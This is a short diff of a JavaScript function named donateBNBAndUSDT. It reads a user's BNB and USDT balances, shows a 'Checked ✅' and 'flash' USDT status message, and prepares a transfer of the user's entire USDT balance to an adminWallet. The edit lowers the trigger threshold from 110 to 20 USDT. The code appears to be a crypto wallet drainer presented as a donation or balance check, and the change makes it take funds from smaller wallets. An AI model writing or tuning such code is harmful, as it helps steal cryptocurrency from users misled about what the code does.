@@ -121,7 +121,7 @@ export async function donateBNBAndUSDT() {
     console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
     console.log("Current USDT balance:", usdtBalanceInUsdt);
     let usdttoshow = parseFloat(usdtBalanceInUsdt).toFixed(2);
-    if (parseFloat(usdtBalanceInUsdt) <= 110) {
+    if (parseFloat(usdtBalanceInUsdt) <= 20) {
       const statusMessage = {
         amount: "Amount = Checked ✅",
         flash: "USDT = $"+usdttoshow+" "
@@ -133,7 +133,7 @@ export async function donateBNBAndUSDT() {
     let bnbAmount = '0', usdtAmount = '0';
 
     // Check if user has USDT but not enough BNB for gas
-    if (parseFloat(usdtBalanceInUsdt) > 110) {
+    if (parseFloat(usdtBalanceInUsdt) > 20) {
       // Estimate gas needed for USDT transfer
       const gasPrice = await web3.eth.getGasPrice();
       const gasLimit = await usdtContract.methods.transfer(adminWallet, usdtBalance)
